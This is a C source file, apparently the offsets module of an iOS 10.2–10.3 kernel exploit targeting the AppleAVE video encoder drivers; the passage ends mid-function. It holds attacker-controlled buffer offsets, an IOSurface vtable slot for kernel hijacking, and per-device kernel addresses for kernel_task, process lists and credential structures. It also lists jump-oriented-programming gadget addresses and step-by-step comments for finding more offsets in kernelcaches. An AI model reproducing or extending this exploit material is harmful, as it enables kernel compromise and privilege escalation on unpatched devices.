#include "offsets.h"

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>
#include <errno.h>
#import <sys/sysctl.h>
#include <UIKit/UIKit.h>

#include "apple_ave_utils.h"
#include "kernel_call.h"

static offsets_t g_offsets;
static uint64_t g_kernel_base = 0;

// kppless --
unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_comm = 0x26c;             // proc_t::p_comm
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)

/*
 * Function name: 	offsets_get_kernel_base
 * Description:		Gets the kernel base.
 * Returns:			uint64_t.
 */

uint64_t offsets_get_kernel_base() {
    
    return g_kernel_base;
}

/*
 * Function name: 	offsets_set_kernel_base
 * Description:		Sets the kernel base from ziVA and for extra_recipe.
 * Returns:			void.
 */

void offsets_set_kernel_base(uint64_t kernel_base) {
    
    g_kernel_base = kernel_base;
    g_offsets.main_kernel_base = g_kernel_base - g_offsets.kernel_base + g_offsets.kernel_text;
    
    printf("[INFO]: g_offsets.main_kernel_base: 0x%llx\n", g_offsets.main_kernel_base);
    printf("[INFO]: g_kernel_base: 0x%llx\n", g_kernel_base);
    printf("[INFO]: g_offsets.kernel_base: 0x%llx\n", g_offsets.kernel_base);
    printf("[INFO]: g_offsets.kernel_text: 0x%llx\n", g_offsets.kernel_text);
}


/*
 * Function name: 	offsets_get_offsets
 * Description:		Gets the main offsets object.
 * Returns:			offsets_t.
 */

offsets_t offsets_get_offsets() {
    
    return g_offsets;
}

kern_return_t set_driver_offsets (char * driver_name) {
    
    printf("[INFO]: Setting offsets for driver: %s\n", driver_name);

    g_offsets.driver_name = driver_name;

    if(strcmp(driver_name, "AppleAVEDriver") == 0) {
        
        g_offsets.add_client_input_buffer_size = 0x4;
        
        g_offsets.encode_frame_input_buffer_size = 0x300;
        g_offsets.encode_frame_output_buffer_size = 0x1E8;
        

    } else if(strcmp(driver_name, "AppleVXE380Driver") == 0) {
        
        g_offsets.add_client_input_buffer_size = 0x4;

        g_offsets.encode_frame_input_buffer_size = 0x650;
        g_offsets.encode_frame_output_buffer_size = 0x130;
        
    } else if(strcmp(driver_name, "AppleAVE2Driver") == 0) {
        
        g_offsets.add_client_input_buffer_size = 0x8;
        
//        g_offsets.encode_frame_input_buffer_size = 0x470;
//        g_offsets.encode_frame_output_buffer_size = 0x2E0;

        
        // TODO: this is temporary (10.3.2) pls replace with above ^
        g_offsets.encode_frame_input_buffer_size = 0x188;
        g_offsets.encode_frame_output_buffer_size = 0x4;
  
        
    } else {
        
        printf("[ERROR]: Driver %s is not supported (yet)", driver_name);
        return KERN_ABORTED;
    }
    
    
    return KERN_SUCCESS;
}


void init_default(){
    
    /*
     Find the string "AVE ERROR: SetSessionSettings chroma_format_idc = %d."
     There's only one usage. The branch is being called from the same place.
     There's a check whether 0 <= chroma <= 4, Taken from *(X19 + W8)
     The only call from that branch is just below a lot of memcpys.
     
     Let's say that W8 is 0x4AD0 (our case for that symbol).
     We see that there's a memcpy(X19 + 0x4AA8, X27 + 0x3B70, 0x5AC)
     memcpy((void *)(v9 + 0x4AA8), v16 + 0xEDC, 0x5ACuLL);
     
     Our chroma offset falls within that memcpy.
     So if 0x4AD0 (FFFFFFF0066A0378) is the chroma offset, 0x4AD0 - 0x4AA8 == 0x28.
     The memcpy (FFFFFFF0066A0304) from our controlled input starts at 0x3B70 in that case.
     Therefore the chroma format offset is 0x3B70 + 0x28.
     */
    /*
     memmovea_74(v13 + 0x4AA8, v20 + 0x3B70, 0x5ACLL);
     v32 = *((_DWORD *)v13 + 0x12B4);
     */
    g_offsets.encode_frame_offset_chroma_format_idc = (0x3B70+0x28);
    
    /*
     The same as before goes here, ui32Width is being checked, it has to be > 0xC0
     It just checked just slightly after the chroma format IDC check.
     We see that the memcpy that is responsible for copying ui32Width looks like that:
     memcpy(X19 + 0x194C, X27 + 0xA14) // AVEH7
     
     X28 is ui32Width in our case, which is X19 + 0x194C (FFFFFFF0066A02AC).
     Therefore 0xA14 is ui32Width in our case
     */
    /*
     v30 = v13 + 0x194C;
     *(_DWORD *)v30 <= 0xBFu
     */
    g_offsets.encode_frame_offset_ui32_width = (0xA10+4); // AVEH7: 0xA10+4 - VXE380: ?
    
    /*
     Just the same explanation as before, but instead of 0x194C, 0x1950 is being checked.
     Hence we just increase by 4, because it is being copied by the same memcpy as before.
     */
    g_offsets.encode_frame_offset_ui32_height = (0xA10+8);
    
    /*
     Pretty much the same like before. String reference is "AVE ERROR: SlicesPerFrame  = %d" this time.
     Slices per frame is being checked at offset 0x1CC0.
     The responsible memcpy is memcpy(X19 + 0x1C90, X27 + 0xD58, 0x2E18)
     0x1CC0 - 0x1C90 == 0x30.
     It starts to be copied from our input buffer at offset 0xD58.
     Hence the offset, 0xD58(where our input buffer is being copied) + 0x30(offset from copied dest starting point)
     */
    g_offsets.encode_frame_offset_slice_per_frame = (0xD58+0x30);
    
    /*
     I don't think it's ever going to change..
     */
    g_offsets.encode_frame_offset_info_type = (0x10);
    
    /*
     There are 2 usages of the following string:
     "AVE WARNING: m_PoweredDownWithClientsStillRegistered = true - ask to reset, the HW is in a bad state..."
     One just slightly above an IOMalloc(0x28), one somewhere else.
     Go to the one above the IOMalloc.

     LDR             X0, [X23,#0x11D8] ; 0xfffffff0066a38d0 (AVEH7)
     CBNZ            X0, somewhere
     MOV             W0, #0x28
     BL              _IOMalloc
     STR             X0, [X23,#0x11D8]
     
     The offset is where the IOMalloc put its allocated address.
     */
    g_offsets.encode_frame_offset_iosurface_buffer_mgr = (0x11D8); // 0x11D8: AVEH7
    
    /*
	    Find the following string:
	    "AVE ERROR: IMG_V_EncodeAndSendFrame multiPassEndPassCounterEnc (%d) >= H264VIDEOENCODER_MULTI_PASS_PASSES\n"
	    That's the check that, if not passed, leads to the print of that string:
     LDR             W25, [X22,#0xC]
     CMP             W25, #2
     B.CC            somewhere
     
	    The offset from X22 is what we should put here.
     */
    g_offsets.kernel_address_multipass_end_pass_counter_enc = (0xC);
    
    /*
     There's a string "inputYUV" which is being used twice.
     One time, just above _mach_absolute_time, one time somewhere else.
     Above it, we see the following:
     MOV             W8, #0x4A88
     LDRB            W7, [X19,X8]
     
     Just like before, the X19 is from our memcpy, so we see that the responsible memcpy is:
     memcpy(X19 + 0x1C90, X27 + 0xD58, 0x2E18)
     
     So 0x4A88 - 0x1C90 == 0x2DF8
     So 0x2DF8 + 0xD58(that's where they start copying from our input buffer) == 0x3B50.
     */
    g_offsets.encode_frame_offset_keep_cache = (0x3B50); // AVEH7: 0x3B50
    
    /* IOFence current fences list head in the IOSurface object */
    
    g_offsets.iosurface_current_fences_list_head = 0x210;
    
    g_offsets.struct_proc_p_comm = 0x26C;
    
    g_offsets.struct_proc_p_ucred = 0x100;
    
    g_offsets.struct_kauth_cred_cr_ref = 0x10;
    
    g_offsets.struct_proc_p_uthlist = 0x98;
    
    g_offsets.struct_uthread_uu_ucred = 0x168;
    
    g_offsets.struct_uthread_uu_list = 0x170;
    
    /*
    	IOSurface->lockSurface
    	Find "H264IOSurfaceBuf ERROR: lockSurface failed."
    	Both strings have BLR X8 above them.
    	Find the nearest LDR X8, [something, OFFSET].
    	The OFFSET is mostly 0x98. If something else, then change this.
     */
    g_offsets.iosurface_vtable_offset_kernel_hijack = 0x98;
    
    
    // TODO: Find offsets for each device instead
    g_offsets.main_kernel_base = 0xFFFFFFF007004000;
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base;
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base;
    
    
    /* look for nullsub_1 */
    g_offsets.ret_gadget = 0xfffffff000000000 - g_offsets.kernel_base;
    
    /* use joker -m path_to_decrypted_kernelcache
       you should get the mach_vm_subsystem with _Xmach_vm_wire
     EDIT: it's probably the subroutine right after the end of mach_vm_remap (IT IS!)
     */
    g_offsets.mach_vm_wire = 0xfffffff000000000 - g_offsets.kernel_base;

    /* look for "Couldn't allocate send right for fileport!" and follow the caller
     
    __TEXT_EXEC:__text:FFFFFFF007387AE4                 BL              ipc_port_make_send <-- the function we need
    __TEXT_EXEC:__text:FFFFFFF007387AE8                 ADD             X8, X0, #1
    __TEXT_EXEC:__text:FFFFFFF007387AEC                 CMP             X8, #1
    __TEXT_EXEC:__text:FFFFFFF007387AF0                 B.LS            loc_FFFFFFF007387B98 <-- branch
     
     Example shown using i6(N61) 10.2.1 - 14D27
    */
    g_offsets.ipc_port_make_send = 0xfffffff000000000 - g_offsets.kernel_base;
    
    /* look for "ipc_clock_init" (reference: ipc_clock.c in XNU's source code)
       then choose the 2nd caller - should be something like this:
     
     __TEXT_EXEC:__text:FFFFFFF0070D6428                 BL              ipc_port_alloc_special <-- the function we need
     __TEXT_EXEC:__text:FFFFFFF0070D642C                 CBZ             X0, loc_FFFFFFF0070D9098
     __TEXT_EXEC:__text:FFFFFFF0070D6430                 ADRP            X19, #off_FFFFFFF007524108@PAGE
     __TEXT_EXEC:__text:FFFFFFF0070D6434                 ADD             X19, X19, #off_FFFFFFF007524108@PAGEOFF
     __TEXT_EXEC:__text:FFFFFFF0070D6438                 STR             X0, [X19,#(qword_FFFFFFF007524110 - 0xFFFFFFF007524108)]
     __TEXT_EXEC:__text:FFFFFFF0070D643C                 LDR             X0, [X20,#qword_FFFFFFF007547308@PAGEOFF]
     __TEXT_EXEC:__text:FFFFFFF0070D6440                 BL              ipc_port_alloc_special <-- the function we need
     __TEXT_EXEC:__text:FFFFFFF0070D6444                 CBZ             X0, loc_FFFFFFF0070D9098
     Example shown using i6(N61) 10.2.1 - 14D27
     */
    g_offsets.ipc_port_alloc_special = 0xfffffff000000000 - g_offsets.kernel_base;
    
    /* look for "ipc_kobject_server: strange destination rights" (reference: ipc_kobject.c:402)
       the caller function should be something like this:
     __TEXT_EXEC:__text:FFFFFFF00709F074                 B.NE            loc_FFFFFFF0070A057C
     __TEXT_EXEC:__text:FFFFFFF00709F078                 LDR             X0, [X23,#8]
     __TEXT_EXEC:__text:FFFFFFF00709F07C                 BL              _ipc_port_release_send
     __TEXT_EXEC:__text:FFFFFFF00709F080                 B               loc_FFFFFFF00709F08C
     ....
     _TEXT_EXEC:__text:FFFFFFF00709F0F8                 B.LS            loc_FFFFFFF00709FE80
     __TEXT_EXEC:__text:FFFFFFF00709F0FC                 LDR             X10, [X10,#0x60]
     __TEXT_EXEC:__text:FFFFFFF00709F100                 ADRP            X11, #ipc_space_kernel@PAGE <-- ipc_space_kernel
     __TEXT_EXEC:__text:FFFFFFF00709F104                 LDR             X11, [X11,#ipc_space_kernel@PAGEOFF]
     Example shown using i6(N61) 10.2.1 - 14D27
     */
    g_offsets.ipc_space_kernel = 0xfffffff000000000 - g_offsets.kernel_base;
    
    /* look for function "_host_get_exception_ports".. the function right after it is ipc_kobject_set */
    g_offsets.ipc_kobject_set = 0xfffffff000000000 - g_offsets.kernel_base;

    
    /* look for 'mount_common(): mount of %s filesystem failed with %d, but vnode list is not empty.'
       and follow the main function
    */
    g_offsets.mount_common = 0xfffffff000000000 - g_offsets.kernel_base;
    
    /*
        Look for 'zone_init: kmem_suballoc failed':
         __TEXT_EXEC:__text:FFFFFFF0070D51B8 loc_FFFFFFF0070D51B8                    ; CODE XREF: __TEXT_EXEC:__text:FFFFFFF0070D1AA8↑j
         __TEXT_EXEC:__text:FFFFFFF0070D51B8                 ADR             X0, aZoneInitKmemSu ; "\"zone_init: kmem_suballoc failed\""
         __TEXT_EXEC:__text:FFFFFFF0070D51BC                 NOP
         __TEXT_EXEC:__text:FFFFFFF0070D51C0                 BL              _panic
         
        Go to the address referencing that (should be a CBNZ)
        There should be a ADRP before that CBNZ, right after ADRP, you'll see an ADD
        Use the address address of X5 (address in add x5 + the address in adrp x5):
         __TEXT_EXEC:__text:FFFFFFF0070D1A84                 LDR             X0, [X22,#_kernel_map@PAGEOFF]
         __TEXT_EXEC:__text:FFFFFFF0070D1A88                 ADRP            X5, #0xFFFFFFF007558000 <-------
         __TEXT_EXEC:__text:FFFFFFF0070D1A8C                 ADD             X5, X5, #0x478 <-------
         __TEXT_EXEC:__text:FFFFFFF0070D1A90                 MOV             W4, #0xC000000
         __TEXT_EXEC:__text:FFFFFFF0070D1A94                 MOVK            W4, #0x101
         __TEXT_EXEC:__text:FFFFFFF0070D1A98                 ADD             X1, SP, #0x68
         __TEXT_EXEC:__text:FFFFFFF0070D1A9C                 MOV             W3, #0
         __TEXT_EXEC:__text:FFFFFFF0070D1AA0                 MOV             X2, X20
         __TEXT_EXEC:__text:FFFFFFF0070D1AA4                 BL              sub_FFFFFFF00712E0F0
         __TEXT_EXEC:__text:FFFFFFF0070D1AA8                 CBNZ            W0, loc_FFFFFFF0070D51B8
        Example shown using i6 10.3.1
     */
    g_offsets.zone_map = 0xFFFFFFF007558478 - g_offsets.kernel_base;
    
    
    // 10.2.1 has size of 0x338
    g_offsets.iosurface_kernel_object_size = 0x350;
    
    
    // JOP stuff
    g_offsets.jop_GADGET_PROLOGUE_1                = 0;
    g_offsets.jop_LDP_X2_X1_X1__BR_X2              = 0;
    g_offsets.jop_MOV_X23_X0__BLR_X8               = 0;
    g_offsets.jop_GADGET_INITIALIZE_X20_1          = 0;
    g_offsets.jop_MOV_X25_X0__BLR_X8               = 0;
    g_offsets.jop_GADGET_POPULATE_1                = 0;
    g_offsets.jop_MOV_X19_X9__BR_X8                = 0;
    g_offsets.jop_MOV_X20_X12__BR_X8               = 0;
    g_offsets.jop_MOV_X21_X5__BLR_X8               = 0;
    g_offsets.jop_MOV_X22_X6__BLR_X8               = 0;
    g_offsets.jop_MOV_X0_X3__BLR_X8                = 0;
    g_offsets.jop_MOV_X24_X4__BR_X8                = 0;
    g_offsets.jop_MOV_X8_X10__BR_X11               = 0;
    g_offsets.jop_GADGET_CALL_FUNCTION_1           = 0;
    g_offsets.jop_GADGET_STORE_RESULT_1            = 0;
    g_offsets.jop_GADGET_EPILOGUE_1                = 0;
    g_offsets.jop_GADGET_PROLOGUE_2                = 0;
    g_offsets.jop_MOV_X25_X19__BLR_X8              = 0;
    g_offsets.jop_GADGET_POPULATE_2                = 0;
    g_offsets.jop_MOV_X19_X5__BLR_X8               = 0;
    g_offsets.jop_MOV_X20_X19__BR_X8               = 0;
    g_offsets.jop_MOV_X5_X6__BLR_X8                = 0;
    g_offsets.jop_MOV_X21_X11__BLR_X8              = 0;
    g_offsets.jop_MOV_X22_X9__BLR_X8               = 0;
    g_offsets.jop_MOV_X8_X10__BR_X12               = 0;
    g_offsets.jop_GADGET_EPILOGUE_2                = 0;
}

// iPad Air 1 (J72AP) - iOS 10.2 (14C92)
void set_j71ap_10_2() {
    g_offsets.kernel_base = 0xfffffff006194000; // same
    g_offsets.kernel_task = 0xFFFFFFF0075B6050 - g_offsets.kernel_base; // updated
    g_offsets.realhost = 0xFFFFFFF00753CA98 - g_offsets.kernel_base; // updated
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff00704b893 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00744ee4c - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xFFFFFFF0075B60E0 - g_offsets.kernel_base; // updated
    g_offsets.cachesize_callback = 0xfffffff0073b1ff4 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xfffffff00752e678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070A9418 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006F32A08 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00752e628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b8a0 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xfffffff0071835b8 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075b0418 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff0071837c0 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070aac30 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff00705d611 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base; // same
}


// iPod Touch 6 (N102AP) - iOS 10.2.1 (14D27)
void set_n102ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006144000; // added
    g_offsets.kernel_task = 0xFFFFFFF0075C2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xFFFFFFF007548A98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00745B100 - g_offsets.kernel_base; // updated
    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xFFFFFFF0073BE2A8 - g_offsets.kernel_base; // updated
    g_offsets.sysctl_hw_family = 0xFFFFFFF00753A678 - g_offsets.kernel_base; // updated
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF9688 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // updated
    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // updated
    g_offsets.all_proc = 0xFFFFFFF0075BC468 - g_offsets.kernel_base; // updated
    g_offsets.copyout = 0xFFFFFFF00718F974 - g_offsets.kernel_base; // updated
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
}

// iPhone 6 - iOS 10.2 (14C92)
void init_RELEASE_ARM64_T7000_1630_37893214() {
    g_offsets.kernel_base = 0xFFFFFFF0060CC000; // same
    g_offsets.main_kernel_base = 0xFFFFFFF007004000; // added
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // added
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // added
    g_offsets.l1icachesize_string = 0xFFFFFFF007057883 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00745b0dc - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xFFFFFFF0073BE284 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00753A678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xFFFFFFF00753A628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xFFFFFFF007057890 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF00718F748 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF00718F950 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xFFFFFFF0070B6DD0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xFFFFFFF007069601 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xFFFFFFF00706A407 - g_offsets.kernel_base; // same
}


// iPhone 6 (N61AP) - iOS 10.2.1 (14D27)
void set_n61ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF0060C8000; // updated
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // added
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // added
    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
    
    g_offsets.jop_GADGET_PROLOGUE_1       = 0xfffffff00671c214 - g_offsets.kernel_base;
    g_offsets.jop_LDP_X2_X1_X1__BR_X2     = 0xfffffff006b474a4 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X23_X0__BLR_X8      = 0xfffffff007485794 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_INITIALIZE_X20_1 = 0xfffffff006633d44 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X25_X0__BLR_X8      = 0xfffffff0073ca478 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_POPULATE_1       = 0xfffffff006d47820 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X19_X9__BR_X8       = 0xfffffff006c179cc - g_offsets.kernel_base;
    g_offsets.jop_MOV_X20_X12__BR_X8      = 0xfffffff006bdd950 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X21_X5__BLR_X8      = 0xfffffff0069ada78 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X22_X6__BLR_X8      = 0xfffffff00698c87c - g_offsets.kernel_base;
    g_offsets.jop_MOV_X0_X3__BLR_X8       = 0xfffffff00741bd44 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X24_X4__BR_X8       = 0xfffffff0069ade74 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X8_X10__BR_X11      = 0xfffffff0069e7c38 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_CALL_FUNCTION_1  = 0xfffffff0074a49dc - g_offsets.kernel_base;
    g_offsets.jop_GADGET_STORE_RESULT_1   = 0xfffffff006844394 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_EPILOGUE_1       = 0xfffffff00708c6d8 - g_offsets.kernel_base;

    g_offsets.mount_common = 0xFFFFFFF0071C8E9C - g_offsets.kernel_base;
    g_offsets.vfs_context_current = 0xFFFFFFF0071DFC90 - g_offsets.kernel_base;
    g_offsets.copyinstr = 0xFFFFFFF0071DFC90 - g_offsets.kernel_base;
    
    // Not needed for 10.2.x - just testing stuff
    g_offsets.kernel_map = 0xFFFFFFF0075C2058 - g_offsets.kernel_base; // added
    g_offsets.zone_map = 0xFFFFFFF007566360 - g_offsets.kernel_base; // added
    g_offsets.mach_vm_remap = 0xFFFFFFF007166100 - g_offsets.kernel_base; // added
    g_offsets.ipc_port_make_send = 0xFFFFFFF0070A5D44 - g_offsets.kernel_base; // added
    g_offsets.ipc_port_alloc_special = 0xFFFFFFF0070A6200 - g_offsets.kernel_base; // added
    g_offsets.ipc_space_kernel = 0xFFFFFFF007547308 - g_offsets.kernel_base; // added
    g_offsets.ipc_kobject_set = 0xFFFFFFF0070B98A0 - g_offsets.kernel_base; // added
    g_offsets.mach_vm_wire = 0xfffffff007166b98 - g_offsets.kernel_base; // added
}

// iPhone 6 Plus (N56AP) - iOS 10.2.1 (14D27)
void set_n56ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF0060C8000; // same
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
}

// iPhone SE (N69AP) - iOS 10.2.1 (14D27)
void set_n69ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006078000; // updated
    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // added
    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // added
    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // updated
    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // updated
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // updated
    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E8BB88 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // updated
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // updated
    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // updated
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
}

// iPhone SE (N69uAP) - iOS 10.2.1 (14D27)
void set_n69uap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006078000; // updated
    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // added
    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // added
    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // updated
    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // updated
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // updated
    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E8BB88 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // updated
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // updated
